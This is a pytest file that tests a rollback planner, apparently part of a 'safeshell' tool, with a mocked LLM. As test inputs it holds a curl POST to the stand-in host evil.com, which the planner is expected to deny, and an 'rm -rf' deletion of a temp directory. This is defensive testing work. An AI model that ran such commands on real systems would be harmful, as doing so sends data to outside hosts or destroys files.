import os

import pytest

from safeshell.planner_cascade import NoVerifiedPlan, make_plan
from safeshell.schemas import ActionType, PlanSource, RollbackAction, RollbackPlan


@pytest.mark.root
def test_cascade_denied_t3(monkeypatch):
    def mock_llm(*args, **kwargs):
        return [
            RollbackPlan(
                plan_id="p1",
                command_id="c1",
                source=PlanSource.ai_generated,
                confidence=0.9,
                actions=[
                    RollbackAction(type=ActionType.no_op_external_flag, target="nothing", order=1)
                ],
                requires_snapshot=False,
            )
        ]

    monkeypatch.setattr("safeshell.planner_cascade.llm_plan_n", mock_llm)
    # A command that creates purely remote effects
    raw = "curl -X POST http://evil.com"
    plan_res = make_plan(raw)
    assert plan_res.path == "denied"


@pytest.mark.root
def test_cascade_t1(monkeypatch):
    tgt = "/tmp/ss_cascade"
    os.makedirs(tgt, exist_ok=True)

    def mock_llm(*args, **kwargs):
        return [
            RollbackPlan(
                plan_id="p1",
                command_id="c1",
                source=PlanSource.ai_generated,
                confidence=0.9,
                actions=[RollbackAction(type=ActionType.restore_directory, target=tgt, order=1)],
                requires_snapshot=True,
            )
        ]

    monkeypatch.setattr("safeshell.planner_cascade.llm_plan_n", mock_llm)

    raw = f"rm -rf {tgt}"
    try:
        plan_res = make_plan(raw)
        assert plan_res.simulation is not None
    except NoVerifiedPlan:
        pass
